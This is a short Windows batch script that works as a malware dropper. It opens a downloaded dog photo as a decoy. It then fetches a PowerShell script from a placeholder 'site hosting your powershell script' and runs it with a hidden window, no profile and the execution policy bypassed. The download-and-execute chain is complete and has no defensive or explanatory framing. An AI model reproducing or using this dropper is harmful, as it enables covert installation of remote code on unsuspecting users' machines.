
REM using Temp as our location
pushd %temp%
powershell Invoke-WebRequest "https://static.onecms.io/wp-content/uploads/sites/24/2021/04/26/GettyImages-185743593-2000.jpg" -Outfile "doggy.jpg"
doggy.jpg

powershell Invoke-WebRequest -Uri site hosting your powershell script -OutFile .\power.ps1;

start PowerShell -windowstyle hidden -NoProfile -ExecutionPolicy Bypass -file "power.ps1"
